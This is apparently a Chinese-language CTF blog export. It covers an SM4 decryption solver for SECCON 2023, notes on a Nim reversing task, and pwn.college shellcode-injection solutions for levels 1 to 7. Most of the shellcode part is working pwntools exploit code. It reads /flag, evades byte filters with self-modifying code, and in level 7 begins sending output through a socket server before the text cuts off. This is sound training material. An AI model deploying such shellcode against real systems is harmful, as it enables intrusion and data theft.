&#125;
#endif
#ifndef PUT_ULONG_BE
#define PUT_ULONG_BE(n, b, i) \
&#123; \
(b)[(i)] = (unsigned char)((n) &gt;&gt; 24); \
(b)[(i) + 1] = (unsigned char)((n) &gt;&gt; 16); \
(b)[(i) + 2] = (unsigned char)((n) &gt;&gt; 8); \
(b)[(i) + 3] = (unsigned char)((n)); \
&#125;
#endif
#define SHL(x, n) (((x)&amp;0xFFFFFFFF) &lt;&lt; n)
#define ROTL(x, n) (SHL((x), n) | ((x) &gt;&gt; (32 - n)))
#define SWAP(a, b) \
&#123; \
unsigned long t = a; \
a = b; \
b = t; \
t = 0; \
&#125;
static const unsigned char SboxTable[16][16] = &#123;
    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B,
    0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0,
    0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26,
    0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
    0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2,
    0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0,
    0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED,
    0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
    0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F,
    0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5,
    0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC,
    0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
    0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14,
    0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C,
    0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D,
    0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
    0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F,
    0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E,
    0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11,
    0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F,
    0xB0, 0x54, 0xBB, 0x16&#125;;
static const unsigned long FK[4] = &#123;0xFF324600, 0x4F9A25B8, 0x3CC7477C,
    0x0C0B9ECD&#125;;
static const unsigned long CK[32] = &#123;
    0xEC656287, 0xD9A22031, 0x01C7BCA8, 0xABE7033B, 0x313FE5DC, 0x940FFAD0,
    0x176EDEB8, 0x7C61B20E, 0x9EAD452F, 0x80E2C15B, 0xBA500D7B, 0xA2C0449F,
    0xBC0E774F, 0x3E393763, 0x43D46B3F, 0x2ADEF404, 0xCA884B87, 0x3C953C45,
    0x7CDBDE63, 0x6E995945, 0xB6CF3655, 0x8D60396A, 0x9A496B38, 0x9D87D81B,
    0x36FEDBC9, 0x79882953, 0x10611E15, 0x0030AB3E, 0x12503487, 0x187E21FF,
    0x6D85127E, 0xDF42C76C,
&#125;;
static unsigned char sm4Sbox(unsigned char inch) &#123;
    unsigned char *pTable = (unsigned char *)SboxTable;
    unsigned char retVal = (unsigned char)(pTable[inch]);
    return retVal;
&#125;
static unsigned long sm4Lt(unsigned long ka) &#123;
    unsigned long bb = 0;
    unsigned long c = 0;
    unsigned char a[4];
    unsigned char b[4];
    PUT_ULONG_BE(ka, a, 0)
    b[0] = sm4Sbox(a[0]);
    b[1] = sm4Sbox(a[1]);
    b[2] = sm4Sbox(a[2]);
    b[3] = sm4Sbox(a[3]);
    GET_ULONG_BE(bb, b, 0)
    c = bb ^ (ROTL(bb, 3)) ^ (ROTL(bb, 14)) ^ (ROTL(bb, 15)) ^ (ROTL(bb, 9));
    return c;
&#125;
static unsigned long sm4F(unsigned long x0, unsigned long x1, unsigned long x2,
    unsigned long x3, unsigned long rk) &#123;
    return (x0 ^ sm4Lt(x1 ^ x2 ^ x3 ^ rk));
&#125;
static unsigned long sm4CalciRK(unsigned long ka) &#123;
    unsigned long bb = 0;
    unsigned long rk = 0;
    unsigned char a[4];
    unsigned char b[4];
    PUT_ULONG_BE(ka, a, 0)
    b[0] = sm4Sbox(a[0]);
    b[1] = sm4Sbox(a[1]);
    b[2] = sm4Sbox(a[2]);
    b[3] = sm4Sbox(a[3]);
    GET_ULONG_BE(bb, b, 0)
    rk = bb ^ (ROTL(bb, 11)) ^ (ROTL(bb, 25));
    return rk;
&#125;
static void sm4_setkey(unsigned long SK[32], unsigned char key[16]) &#123;
    unsigned long MK[4];
    unsigned long k[36];
    unsigned long i = 0;
    GET_ULONG_BE(MK[0], key, 0);
    GET_ULONG_BE(MK[1], key, 4);
    GET_ULONG_BE(MK[2], key, 8);
    GET_ULONG_BE(MK[3], key, 12);
    k[0] = MK[0] ^ FK[0];
    k[1] = MK[1] ^ FK[1];
    k[2] = MK[2] ^ FK[2];
    k[3] = MK[3] ^ FK[3];
    for (; i &lt; 32; i++) &#123;
        k[i + 4] = k[i] ^ (sm4CalciRK(k[i + 1] ^ k[i + 2] ^ k[i + 3] ^ CK[i]));
        SK[i] = k[i + 4];
    &#125;
&#125;
static void sm4_one_round(unsigned long sk[32], unsigned char input[16],
    unsigned char output[16]) &#123;
    unsigned long i = 0;
    unsigned long ulbuf[36];
    memset(ulbuf, 0, sizeof(ulbuf));
    GET_ULONG_BE(ulbuf[0], input, 0)
    GET_ULONG_BE(ulbuf[1], input, 4)
    GET_ULONG_BE(ulbuf[2], input, 8)
    GET_ULONG_BE(ulbuf[3], input, 12)
    while (i &lt; 32) &#123;
        ulbuf[i + 4] =
        sm4F(ulbuf[i], ulbuf[i + 1], ulbuf[i + 2], ulbuf[i + 3], sk[i]);
        i++;
    &#125;
    PUT_ULONG_BE(ulbuf[35], output, 0);
    PUT_ULONG_BE(ulbuf[34], output, 4);
    PUT_ULONG_BE(ulbuf[33], output, 8);
    PUT_ULONG_BE(ulbuf[32], output, 12);
&#125;
void sm4_setkey_enc(sm4_context *ctx, unsigned char key[16]) &#123;
    ctx-&gt;mode = SM4_ENCRYPT;
    sm4_setkey(ctx-&gt;sk, key);
&#125;
void sm4_setkey_dec(sm4_context *ctx, unsigned char key[16]) &#123;
    int i;
    ctx-&gt;mode = SM4_DECRYPT;
    sm4_setkey(ctx-&gt;sk, key);
    for (i = 0; i &lt; 16; i++) &#123;
        SWAP(ctx-&gt;sk[i], ctx-&gt;sk[31 - i]);
    &#125;
&#125;
void sm4_crypt_ecb(sm4_context *ctx, int mode, int length, unsigned char *input,
    unsigned char *output) &#123;
    while (length &gt; 0) &#123;
        sm4_one_round(ctx-&gt;sk, input, output);
        input += 16;
        output += 16;
        length -= 16;
    &#125;
&#125;
void sm4_crypt_cbc(sm4_context *ctx, int mode, int length, unsigned char iv[16],
    unsigned char *input, unsigned char *output) &#123;
    int i;
    unsigned char temp[16];
    if (mode == SM4_ENCRYPT) &#123;
        while (length &gt; 0) &#123;
            for (i = 0; i &lt; 16; i++)
                output[i] = (unsigned char)(input[i] ^ iv[i]);
            sm4_one_round(ctx-&gt;sk, output, output);
            memcpy(iv, output, 16);
            input += 16;
            output += 16;
            length -= 16;
        &#125;
    &#125; else /* SM4_DECRYPT */
    &#123;
        while (length &gt; 0) &#123;
            memcpy(temp, input, 16);
            sm4_one_round(ctx-&gt;sk, input, output);
            for (i = 0; i &lt; 16; i++)
                output[i] = (unsigned char)(output[i] ^ iv[i]);
            memcpy(iv, temp, 16);
            input += 16;
            output += 16;
            length -= 16;
        &#125;
    &#125;
&#125;
int main() &#123;
    unsigned char key[17] = &quot;SECCON CTF 2023!&quot;;
    unsigned char input[112] = &#123;
        0xFE, 0x60, 0xA8, 0xC0, 0x3B, 0xFE, 0xBC, 0x66, 0xFC, 0x9A, 0x9B, 0x31,
        0x9A, 0xD8, 0x03, 0xBB, 0xA9, 0xE1, 0x56, 0xFC, 0xFC, 0x11, 0x9F, 0x89,
        0x5F, 0x4D, 0x9F, 0xE0, 0x9F, 0xAE, 0x2A, 0xCF, 0x5E, 0x73, 0xCB, 0xEC,
        0x3F, 0xFF, 0xB9, 0xD1, 0x99, 0x44, 0x1B, 0x9A, 0x79, 0x79, 0xEC, 0xD1,
        0xB4, 0xFD, 0xEA, 0x2B, 0xE2, 0xF1, 0x1A, 0x70, 0x76, 0x3C, 0x2E, 0x7F,
        0x3F, 0x3B, 0x7B, 0x66, 0xA3, 0x4B, 0x1B, 0x5C, 0x0F, 0xBE, 0xDD, 0x98,
        0x5A, 0x5B, 0xD0, 0x0A, 0x3D, 0x7E, 0x2C, 0x10, 0x56, 0x2A, 0x10, 0x87,
        0x5D, 0xD9, 0xB9, 0x7F, 0x3E, 0x2E, 0x86, 0xB7, 0x17, 0x04, 0xDF, 0xB1,
        0x27, 0xC4, 0x47, 0xE2, 0xD9, 0x7A, 0x9A, 0x48, 0x7C, 0xDB, 0xC6, 0x1D,
        0x3C, 0x00, 0xA3, 0x21&#125;;
    unsigned char output[112];
    sm4_context ctx;
    unsigned long i;
    // sm4_setkey_enc(&amp;ctx, key);
    // sm4_crypt_ecb(&amp;ctx, 1, 64, input, output);
    // for (i = 0; i &lt; 64; i++)
    // printf(&quot;%02x &quot;, output[i]);
    // printf(&quot;\n&quot;);
    sm4_setkey_dec(&amp;ctx, key);
    sm4_crypt_ecb(&amp;ctx, 0, 112, input, output);
    for (i = 0; i &lt; 112; i++)
        printf(&quot;%c&quot;, output[i]);
    printf(&quot;\n&quot;);
    return 0;
&#125;
</code></pre>
<h4 id="optinimize"><a href="#optinimize" class="headerlink" title="optinimize"></a>optinimize</h4><p>第一次见的nim编译产物，抽象是有点抽象的，尤其这个符号表（有点当年第一次见rust的美感）</p>
<p>主动态来看，发现它输出flag的几位后就卡住了，本来想着是不是要考模拟执行，然后发现应该就是手动把整个流程复现出来，让他跑就完了</p>
<p>调一下发现主要就是在<code>Q_main</code>里面的<code>P_main</code>卡住的</p>
<p>然后不会了，只得看wp…..555555555555…..</p>
<p>这是模拟的代码，一样是跑不出来的（注意dump的时候都是QWORD格式，可以自己处理一下）</p>
<pre><code class="python">def P(i: int):
    num1 = 3
    num2 = 0
    num3 = 2
    num4 = 0
    if i == num4:
        return num1
    else:
        num5 = 1
        if i == num5:
            return num2
        else:
            num6 = 2
            if i == num6:
                return num3
            else:
                num7 = 2
                if num7 &lt; i:
                    j = i
                    num8 = 2
                    while num8 &lt; j:
                        v98 = num1 + num2
                        num1 = num2
                        num2 = num3
                        num3 = v98
                        j -= 1
                    return num3


def Q(n: int):
    i = num = 0
    while i &lt; n:
        num += 1
        v63 = P(num) % num
        if v63 == 0:
            i += 1
    return num

ns = [0x000000000000004A, 0x0000000000000055, 0x000000000000006F, 0x0000000000000079, 0x0000000000000080, 0x0000000000000095, 0x00000000000000AE, 0x00000000000000BF, 0x00000000000000C7, 0x00000000000000D5, 0x0000000000000306, 0x0000000000001AC8, 0x00000000000024BA, 0x0000000000003D00, 0x0000000000004301, 0x0000000000005626, 0x0000000000006AD9, 0x0000000000007103, 0x000000000000901B, 0x0000000000009E03, 0x00000000001E5FB6, 0x000000000026F764, 0x000000000030BD9E, 0x0000000000407678, 0x00000000005B173B, 0x00000000006FE3B1, 0x000000000078EF25, 0x0000000000858E5F, 0x000000000098C639, 0x0000000000AD6AF6, 0x0000000001080096, 0x00000000018E08CD, 0x0000000001BB6107, 0x0000000001F50FF1, 0x00000000025C6327, 0x0000000002A971B6, 0x0000000002D68493, 0x000000000362F0C0, 0x0000000003788EAD, 0x0000000003CAA8ED]

cs = [0x3C,0xF4,0x1A,0xD0,0x8A,0x17,0x7C,0x4C,0xDF,0x21,0xDF,0xB0,0x12,0xB8,0x4E,0xFA,0xD9,0x2D,0x66,0xFA,0xD4,0x95,0xF0,0x66,0x6D,0xCE,0x69,0x00,0x7D,0x95,0xEA,0xD9,0x0A,0xEB,0x27,0x63,0x75,0x11,0x37,0xD4,0x00,0x00,0x00,0x00,0x00,0x00,0x00]

for i in range(len(cs)):
    print(chr((Q(ns[i]) &amp; 0xff) ^ cs[i]), end=&#39;&#39;)
</code></pre>
<p>唉然后是优化，oi题来了……没太看懂，贴个wp吧…（r3大哥确实太高手了）</p>
<p><img src="/2023/09/18/seccon-2023/image-20230919171428466.png" alt="image-20230919171428466"></p>
]]></content>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>qemu调试记录</title>
    <url>/2023/11/14/qemu%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h6 id="PREFACE：记录一下"><a href="#PREFACE：记录一下" class="headerlink" title="PREFACE：记录一下"></a>PREFACE：记录一下</h6>]]></content>
  </entry>
  <entry>
    <title>shellcodeORW</title>
    <url>/2024/03/05/shellcodeORW/</url>
    <content><![CDATA[<h6 id="PREFACE-pwn-college的shellcode-injection，算是一个小入门"><a href="#PREFACE-pwn-college的shellcode-injection，算是一个小入门" class="headerlink" title="PREFACE: pwn.college的shellcode injection，算是一个小入门~"></a>PREFACE: pwn.college的shellcode injection，算是一个小入门~</h6><span id="more"></span>

<!-- 看了眼discord，不许开writeup，就隐藏了：> -->


<h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>basic orw：</p>
<pre><code class="python">from pwn import *
from string import *
# context.syntax = &#39;intel&#39;
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,log_level=&#39;debug&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
flag_file = &#39;/flag&#39;
flag_file = flag_file[::-1]
flag_file = flag_file.encode().hex()
# print(flag_file)

shellcode = f&#39;&#39;&#39;
// close:
    mov rdi, 2
    mov rax, 3
    syscall

// open:
    mov rbx, 0x&#123;flag_file&#125;
    mov rsi, 0
    mov rdx, 0
    push rbx
    push rsp
    pop rdi
    mov rax, 2
    syscall

// read:
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x50
    xor rax, rax
    syscall

// write:
    mov rdx, rax
    mov rdi, 1
    mov rsi, rsp
    mov rax, 1
    syscall

// exit:
    mov rax, 0x3c
    syscall
&#39;&#39;&#39;
hex_shellcode = asm(shellcode)
# print(hex_shellcode)
p = gdb.debug(&#39;./level1_chall&#39;,&#39;b *main + 560\nb *main + 709&#39;)
p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,hex_shellcode + b&#39;\n&#39;)
# p.send(hex_shellcode + b&#39;\n&#39;)
p.interactive()
</code></pre>
<h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>随机跳一段，全nop即可</p>
<pre><code class="python">from pwn import *
from string import *
# context.syntax = &#39;intel&#39;
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
flag_file = &#39;/flag&#39;
flag_file = flag_file[::-1]
flag_file = flag_file.encode().hex()
# print(flag_file)

shellcode = f&#39;&#39;&#39;
// close:
    mov rdi, 2
    mov rax, 3
    syscall

// open:
    mov rbx, 0x&#123;flag_file&#125;
    mov rsi, 0
    mov rdx, 0
    push rbx
    push rsp
    pop rdi
    mov rax, 2
    syscall

// read:
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x50
    xor rax, rax
    syscall

// write:
    mov rdx, rax
    mov rdi, 1
    mov rsi, rsp
    mov rax, 1
    syscall

// exit:
    mov rax, 0x3c
    syscall
&#39;&#39;&#39;
hex_shellcode = asm(shellcode)
# print(hex_shellcode)
p = gdb.debug(&#39;./level2_chall&#39;,&#39;b *main + 910&#39;)
# while (True):
#     p = process(&#39;./level2_chall&#39;)
#     p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,0x700 * b&#39;\90&#39; + hex_shellcode + b&#39;\n&#39;)
#     # p.send(hex_shellcode + b&#39;\n&#39;)
#     print(p.recv())
#     if (b&#39;flag&#39; in p.recv()):
#         print(p.recv())
#         break
#     p.close()
p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,0x700 * b&#39;\x90&#39; + hex_shellcode + b&#39;\n&#39;)
p.interactive()
</code></pre>
<h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>禁用<code>\x00</code></p>
<pre><code class="python">from pwn import *
from string import *
# context.syntax = &#39;intel&#39;
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
flag_file = &#39;/flag&#39;
flag_file = flag_file[::-1]
flag_file = flag_file.encode().hex()
# print(flag_file)

shellcode = f&#39;&#39;&#39;
// close:
    xor rdx, rdx
    xor rdi, rdi
    xor rax, rax
    mov dil, 2
    mov al, 3
    syscall

// open:
    xor rsi, rsi
    xor rdx, rdx
    sub rsp, 5
    mov byte ptr [rsp], 0x2f
    mov byte ptr [rsp+1], 0x66
    mov byte ptr [rsp+2], 0x6c
    mov byte ptr [rsp+3], 0x61
    mov byte ptr [rsp+4], 0x67
    mov byte ptr [rsp+5], 0x01
    sub byte ptr [rsp+5], 0x01
    push rsp
    pop rdi
    mov al, 2
    syscall

// read:    
    mov rdi, rax
    mov rsi, rsp
    mov dl, 0x50
    xor rax, rax
    syscall

// write:
    mov rdx, rax
    mov al, 1
    push rax
    pop rdi
    mov rsi, rsp
    mov al, 1
    syscall
// exit:
    mov al, 0x3c
    syscall
&#39;&#39;&#39;
hex_shellcode = asm(shellcode)
# print(hex_shellcode)
p = gdb.debug(&#39;./level2_chall&#39;,&#39;b *main + 910&#39;)
# while (True):
#     p = process(&#39;./level2_chall&#39;)
#     p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,0x700 * b&#39;\90&#39; + hex_shellcode + b&#39;\n&#39;)
#     # p.send(hex_shellcode + b&#39;\n&#39;)
#     print(p.recv())
#     if (b&#39;flag&#39; in p.recv()):
#         print(p.recv())
#         break
#     p.close()
p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,0x700 * b&#39;\x90&#39; + hex_shellcode + b&#39;\n&#39;)
p.interactive()
</code></pre>
<h3 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h3><p>ban ‘H’，不能用xor和mov等，用push pop代替赋值即可</p>
<pre><code class="python">from pwn import *
from string import *
# context.syntax = &#39;intel&#39;
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
flag_file = &#39;/flag&#39;
flag_file = flag_file[::-1]
flag_file = flag_file.encode().hex()
# print(flag_file)

shellcode = f&#39;&#39;&#39;
// close:
    push 0
    pop rdx
    push 0
    pop rdi
    push 0
    pop rdx
    mov dil, 2
    mov al, 3
    syscall
    nop
    
// open:
    push 0
    pop rsi
    push 0
    pop rdx
    nop
    push 0
    push 0
    push 0
    push 0
    push 0
    nop
    mov byte ptr [rsp], 0x2f
    mov byte ptr [rsp+1], 0x66
    mov byte ptr [rsp+2], 0x6c
    mov byte ptr [rsp+3], 0x61
    mov byte ptr [rsp+4], 0x67
    mov byte ptr [rsp+5], 0x01
    sub byte ptr [rsp+5], 0x01
    push rsp
    pop rdi
    mov al, 2
    syscall
    nop
// read:    
    push rax
    pop rdi
    push rsp
    pop rsi
    mov dl, 0x50
    push 0
    pop rax
    syscall
    nop
// write:
    push rax
    pop rdx
    mov al, 1
    push rax
    pop rdi
    push rsp
    pop rsi
    mov al, 1
    syscall
// exit:
    mov al, 0x3c
    syscall
&#39;&#39;&#39;
hex_shellcode = asm(shellcode)
# print(hex_shellcode)
# p = gdb.debug(&#39;./level2_chall&#39;,&#39;b *main + 910&#39;)
p = process(&#39;/challenge/babyshell_level4&#39;)
# while (True):
#     p = process(&#39;./level2_chall&#39;)
#     p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,0x700 * b&#39;\90&#39; + hex_shellcode + b&#39;\n&#39;)
#     # p.send(hex_shellcode + b&#39;\n&#39;)
#     print(p.recv())
#     if (b&#39;flag&#39; in p.recv()):
#         print(p.recv())
#         break
#     p.close()
p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,0x700 * b&#39;\x90&#39; + hex_shellcode + b&#39;\n&#39;)
p.interactive()
# p.recv()
</code></pre>
<h3 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h3><p>ban syscall等，得smc拿（代码写复杂了，可以直接获取rip的，不过一时没想起来就用了他的leak来找地址）</p>
<pre><code class="python">from pwn import *
from string import *
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
flag_file = &#39;/flag&#39;
flag_file = flag_file[::-1]
flag_file = flag_file.encode().hex()

# p = gdb.debug(&#39;./level5_chall&#39;,&#39;b *main\nb *main + 873&#39;)
p = process(&#39;./level5_chall&#39;)
p.recvuntil(&#39;[LEAK] Mapping shellcode memory at &#39;)
leak_addr = p.recvn(10).decode()
leak_addr = int(leak_addr, 16)

# close
shellcode = b&#39;&#39;
shellcode_close = &#39;&#39;&#39;
    xor rdi, rdi
    xor rdx, rdx
    xor rax, rax
    xor rsi,rsi
    mov dil, 2
    mov al, 3
&#39;&#39;&#39;
shellcode_close = asm(shellcode_close)
shellcode += shellcode_close
syscall = &#39;&#39;&#39;
    syscall
&#39;&#39;&#39;
syscall = asm(syscall)
after_syscall = bytes(a ^ b for a,b in zip(b&#39;\x90\x90&#39;, syscall))
syscall = f&#39;&#39;&#39;
    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
    nop
    nop
&#39;&#39;&#39;
shellcode += asm(syscall)

# open
shellcode_open = &#39;&#39;&#39;
    mov al, 2
    xor rdx, rdx
    xor rsi, rsi
    mov rbx, 0x0067616c662f
    push rbx
    push rsp
    pop rdi
&#39;&#39;&#39;
shellcode_open = asm(shellcode_open)
shellcode += shellcode_open
syscall = f&#39;&#39;&#39;
    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
    nop
    nop
&#39;&#39;&#39;
shellcode += asm(syscall)

# read
shellcode_read = &#39;&#39;&#39;
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x100
    mov al, 0
&#39;&#39;&#39;
shellcode_read = asm(shellcode_read)
shellcode += shellcode_read
syscall = f&#39;&#39;&#39;
    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
    nop
    nop
&#39;&#39;&#39;
shellcode += asm(syscall)

# write
shellcode_write = &#39;&#39;&#39;
    mov rdi, 1
    mov rsi, rsp
    mov rdx, rax
    mov al, 1
&#39;&#39;&#39;
shellcode_write = asm(shellcode_write)
shellcode += shellcode_write
syscall = f&#39;&#39;&#39;
    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
    nop
    nop
&#39;&#39;&#39;
shellcode += asm(syscall)

shellcode_exit = &#39;&#39;&#39;
    mov rax, 60
&#39;&#39;&#39;
shellcode_exit = asm(shellcode_exit)
shellcode += shellcode_exit
syscall = f&#39;&#39;&#39;
    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
    nop
    nop
&#39;&#39;&#39;
shellcode += asm(syscall)
# print(&#39;--------------------------------------&#39;)
# print(disasm(shellcode))
# print(&#39;--------------------------------------&#39;)
p.sendafter(&#39;Reading 0x1000 bytes from stdin.\n&#39;,shellcode + b&#39;\n&#39;)
p.interactive()
</code></pre>
<h3 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h3><p>比起上一题多了禁用前0x1000的write，不过长度够可以直接绕</p>
<pre><code>.rept 0x1000
    nop
.endr
</code></pre>
<pre><code class="python">from pwn import *
from string import *
context(os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;],log_level=&#39;debug&#39;)
flag_file = &#39;/flag&#39;
flag_file = flag_file[::-1]
flag_file = flag_file.encode().hex()

p = gdb.debug(&#39;./level6_chall&#39;,&#39;b *main\nb *main + 957\nb *main + 525&#39;)
# p = process(&#39;./level6_chall&#39;)
p.recvuntil(&#39;[LEAK] Mapping shellcode memory at &#39;)
leak_addr = p.recvn(10).decode()
leak_addr = int(leak_addr, 16)

# close
shellcode = &#39;&#39;&#39;
.rept 0x1000
nop
.endr
&#39;&#39;&#39;
shellcode = asm(shellcode)
shellcode_close = &#39;&#39;&#39;
    xor rdi, rdi
    xor rdx, rdx
    xor rax, rax
    xor rsi,rsi
    mov dil, 2
    mov al, 3
&#39;&#39;&#39;
shellcode_close = asm(shellcode_close)
shellcode += shellcode_close
syscall = &#39;&#39;&#39;
    syscall
&#39;&#39;&#39;
syscall = asm(syscall)
after_syscall = bytes(a ^ b for a,b in zip(b&#39;\x90\x90&#39;, syscall))
syscall = f&#39;&#39;&#39;
    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
    nop
    nop
&#39;&#39;&#39;
shellcode += asm(syscall)

# open
shellcode_open = &#39;&#39;&#39;
    mov al, 2
    xor rdx, rdx
    xor rsi, rsi
    mov rbx, 0x0067616c662f
    push rbx
    push rsp
    pop rdi
&#39;&#39;&#39;
shellcode_open = asm(shellcode_open)
shellcode += shellcode_open
syscall = f&#39;&#39;&#39;
    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
    nop
    nop
&#39;&#39;&#39;
shellcode += asm(syscall)

# read
shellcode_read = &#39;&#39;&#39;
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x100
    mov al, 0
&#39;&#39;&#39;
shellcode_read = asm(shellcode_read)
shellcode += shellcode_read
syscall = f&#39;&#39;&#39;
    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
    nop
    nop
&#39;&#39;&#39;
shellcode += asm(syscall)

# write
shellcode_write = &#39;&#39;&#39;
    mov rdi, 1
    mov rsi, rsp
    mov rdx, rax
    mov al, 1
&#39;&#39;&#39;
shellcode_write = asm(shellcode_write)
shellcode += shellcode_write
syscall = f&#39;&#39;&#39;
    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
    nop
    nop
&#39;&#39;&#39;
shellcode += asm(syscall)

shellcode_exit = &#39;&#39;&#39;
    mov rax, 60
&#39;&#39;&#39;
shellcode_exit = asm(shellcode_exit)
shellcode += shellcode_exit
syscall = f&#39;&#39;&#39;
    mov rbx, &#123;leak_addr + len(shellcode) + 14&#125;
    xor byte ptr [rbx], &#123;after_syscall[0]&#125;
    xor byte ptr [rbx+1], &#123;after_syscall[1]&#125;
    nop
    nop
&#39;&#39;&#39;
shellcode += asm(syscall)
p.sendafter(&#39;Reading 0x2000 bytes from stdin.\n&#39;,shellcode + b&#39;\n&#39;)
# h = p.recv(0x2000)
# print(h)
p.interactive()
</code></pre>
<h3 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h3><p>ban stdin stdout stderr，这里用socket来传</p>
<p>开server接：</p>
<pre><code class="python">import socket

def start_server(host=&#39;0.0.0.0&#39;, port=5678):
    while(True):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        server_socket.bind((host, port))

        server_socket.listen(5)
        print(f&quot;Listening on &#123;host&#125;:&#123;port&#125;...&quot;)

        client_socket, addr = server_socket.accept()
        print(f&quot;Accepted a connection from &#123;addr&#125;&quot;)

        data = client_socket.recv(1024)
